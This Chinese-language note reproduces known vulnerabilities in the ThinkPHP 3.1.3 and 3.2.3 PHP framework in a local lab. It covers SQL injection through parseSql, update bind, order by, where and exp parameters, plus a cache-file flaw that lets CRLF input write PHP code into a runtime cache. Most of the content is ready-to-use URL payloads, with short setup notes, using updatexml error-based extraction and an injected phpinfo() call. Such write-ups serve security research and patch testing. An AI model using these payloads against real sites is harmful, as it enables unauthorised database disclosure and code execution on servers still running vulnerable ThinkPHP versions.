thinkphp <=3.1.3 parseSql函数 sql注入

在下载的ThinkPHP目录下新建app目录，新建index.php，访问ThinkPHP/app/index.php，成功后app文件夹下会生成工程文件

配置app/conf/config.php设置数据库

<?php
return array(
	//'配置项'=>'配置值'
	'DB_TYPE'   => 'mysql', // 数据库类型
	'DB_HOST'   => 'localhost', // 服务器地址
	'DB_NAME'   => 'test', // 数据库名
	'DB_USER'   => 'root', // 用户名
	'DB_PWD'    => 'root', // 密码
	'DB_PORT'   => 3306, // 端口
	'DB_PREFIX' => '', // 数据库表前缀
);
?>

编辑目录ThinkPHP\app\Lib\Action下的IndexAction.class.php文件，在其中添加一个函数test用于sql查询

payload

http://10.0.0.3/ThinkPHP/app/index.php?s=index/test&name=admin" or 1 -- aa

thinkphp 3.x sql注入

update bind注入

参考：Thinkphp 3.2.3 update注入

payload

http://10.0.0.3/ThinkPHP/index.php?s=/home/test&user[0]=bind&user[1]=0 and (updatexml(1,concat(0x3a,user()),1))%23&password=test123

下载3.2.3源码后，配置Application/Home/Conf下的config.php的数据库信息，然后创建Application/Home/Controller下的TestController文件进行测试

order by 注入

参考：[PHP] ThinkPHP3.2 order by注入分析

payload

http://10.0.0.3/ThinkPHP/index.php?s=/home/test&user=test&order[password and updatexml(1,concat(0x3a,user()),1)]

http://10.0.0.3/ThinkPHP/index.php?s=/home/test&user=test&order=password and updatexml(1,concat(0x3a,user()),1)=

下载3.2.3源码后，配置Application/Home/Conf下的config.php的数据库信息，然后创建Application/Home/Controller下的TestController文件进行测试

where 注入

参考：ThinkPHP3.2.3框架where注入

payload

http://10.0.0.3/ThinkPHP/index.php?s=/home/test&user='test') and 1=updatexml(1,concat(0x7,user(),0x7e),1) %23

下载3.2.3源码后，配置Application/Home/Conf下的config.php的数据库信息，然后创建Application/Home/Controller下的TestController文件进行测试

exp注入

where注入和exp注入的区别在于，exp中的where函数内容必须完全可控，因为需要传入二维数组，且使用I函数获取参数并不会产生注入。

参考：ThinkPHP3.2.3框架exp注入

payload

http://10.0.0.3/ThinkPHP/index.php?s=/home/test&user[0]=exp&user[1]=='test' and 1=updatexml(1,concat(0x7,user(),0x7e),1) %23

thinkphp 3.2.3 缓存漏洞

参考：Thinkphp 3.2.3 缓存漏洞

payload

http://10.0.0.3/ThinkPHP/index.php?s=/home/test&user=admin%0d%0aphpinfo();%0d%0a//

下载3.2.3源码后，创建Application/Home/Controller下的TestController文件写一个调用缓存函数S的的方法进行测试，payload触发后会在Application\Runtime\Temp生成一个php缓存文件写入提交的内容，但$data参数未过滤%0d%0a，可以用换行来绕过行注释，缓存文件为缓存名的md5值，这里即为md5(user)
